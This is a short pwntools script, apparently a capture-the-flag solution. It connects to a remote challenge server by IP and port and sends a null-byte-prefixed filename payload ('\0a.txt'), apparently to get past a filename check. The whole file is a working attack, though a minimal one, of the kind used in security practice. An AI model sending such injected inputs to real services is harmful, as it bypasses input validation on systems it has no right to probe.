from pwn import *

io = remote('178.128.19.56', 4973)
#io = process('./a.out')
print(io.recv())
payload = b'\0a.txt'
pause()
io.sendline(payload)
print(io.recv())
print(io.recv())
print(io.recv())
